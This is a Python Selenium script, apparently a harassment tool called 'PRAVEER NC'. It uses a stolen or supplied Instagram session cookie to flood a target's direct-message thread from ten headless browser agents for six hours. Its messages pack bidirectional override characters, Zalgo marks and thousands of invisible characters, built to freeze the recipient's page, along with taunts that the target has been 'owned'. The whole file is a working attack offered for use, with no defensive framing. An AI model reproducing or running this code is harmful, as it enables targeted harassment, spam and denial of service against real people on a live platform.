# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (10-AGENT BLITZ)
# 📅 STATUS: 5 MACHINES | RELOAD BREAKER | PRAVEER PAPA EDITION

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- GLOBAL CONFIG ---
THREADS = 2  # 2 threads per machine x 5 machines = 10 AGENTS
TOTAL_DURATION = 21600  
BURST_SPEED = (0.01, 0.03) 
SESSION_LIMIT = 45 # Faster reloads to stay ahead of target's "Reload Tab" defense

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_reload_breaker_payload(target):
    header = "👑 PRAVEER PAPA 👑\n"
    sub_header = f"SYSTEM ERROR: {target.upper()} HAS BEEN OWNED\n"
    
    # 200 Directional Overrides (The Layout Killer)
    direction_chaos = ("\u202E" + "\u202D") * 100 
    
    # Massive Zalgo Towers (80 marks deep)
    z_tower = "̸" * 80
    
    # 3500+ Character Invisible Buffer
    bloat = "".join(random.choice(["\u200B", "\u200D", "\u2060"]) for _ in range(3500))
    
    lines = [header, sub_header, bloat]
    for _ in range(35):
        lines.append(direction_chaos + "PRAVEER_OWNZ_YOU" + z_tower)
    lines.append(bloat + "\n🛑 PAGE UNRESPONSIVE 🛑")
    
    return "\n".join(lines)

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new") 
    chrome_options.add_argument("--no-sandbox") 
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    
    # Unique Temp Directory per Agent to prevent file locking
    temp_dir = os.path.join(tempfile.gettempdir(), f"m{MACHINE_ID}_a{agent_id}_{int(time.time())}")
    chrome_options.add_argument(f"--user-data-dir={temp_dir}")
    return webdriver.Chrome(options=chrome_options)

def adaptive_inject(driver, text):
    try:
        box = driver.find_element(By.XPATH, "//div[@role='textbox']")
        driver.execute_script("""
            var el = arguments[0];
            el.focus();
            document.execCommand('insertText', false, arguments[1]);
            el.dispatchEvent(new Event('input', { bubbles: true }));
        """, box, text)
        box.send_keys(Keys.ENTER)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    global_start = time.time()
    while (time.time() - global_start) < TOTAL_DURATION:
        driver = None
        session_start = time.time()
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(5)
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(6)

            while (time.time() - session_start) < SESSION_LIMIT:
                payload = get_reload_breaker_payload(os.getenv("TARGET_NAME", "Target"))
                if adaptive_inject(driver, payload):
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                        print(f"[M{MACHINE_ID}-A{agent_id}] SENT | TOTAL: {GLOBAL_SENT} | PAPA POWER 👑", flush=True)
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass 
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(1)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    raw_url = os.environ.get("GROUP_URL", "").strip()
    target_id = raw_url.split('/')[-2] if '/' in raw_url else raw_url
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id)

if __name__ == "__main__":
    main()
